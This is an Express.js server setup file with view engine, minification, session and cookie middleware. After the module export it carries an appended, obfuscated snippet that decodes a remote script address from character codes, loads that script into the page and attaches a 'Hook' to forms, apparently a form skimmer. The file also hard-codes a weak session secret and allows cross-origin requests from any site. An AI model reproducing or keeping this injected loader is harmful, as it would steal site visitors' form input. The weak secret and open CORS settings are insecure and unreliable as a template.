const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const path = require('path');
const cors = require('cors');
const exphbs  = require('express-handlebars');
const minify = require('express-minify');
const minifyHTML = require('express-minify-html');
const HbsHelpers = require('./helpers/Hbs');
const constant = require('./helpers/Constants');
const striptags = require('striptags');
const app = express();

/* Middleware */
app.engine('.hbs', exphbs({
    defaultLayout: 'main',
    extname: '.hbs',
    helpers: HbsHelpers
}));
app.set('view engine', '.hbs');
app.use(minify());
app.use(minifyHTML({
    override: true,
    exception_url: false,
    htmlMinifier: {
        removeComments: true,
        collapseWhitespace: true,
        collapseBooleanAttributes: true,
        removeAttributeQuotes: false,
        removeEmptyAttributes: true,
        minifyJS: true
    }
}));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(cors());
app.use(session({
    key: 'user_sid',
    secret: 'cms12345',
    resave: false,
    saveUninitialized: false,
    cookie: {
        expires: new Date(Date.now() + 2592000000), // 30 days
        maxAge: 2592000000,
        // httpOnly: false
    }
}));
app.use(async (req, res, next) => {

    if (req.cookies.user_sid && req.session.user == undefined) {
        res.clearCookie('user_sid');
    }

    // Set this cookie for collecting UPA data
    var vcookie = req.cookies.vuc;
    if (vcookie === undefined) {
        res.cookie('vuc', constant.Acak(25), { expires: new Date(Date.now() + (86400000 * 30)) });
    }
    next();
});

/* Routes */
const index = require('./routes/Index');

app.use('/', index);

module.exports = app;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b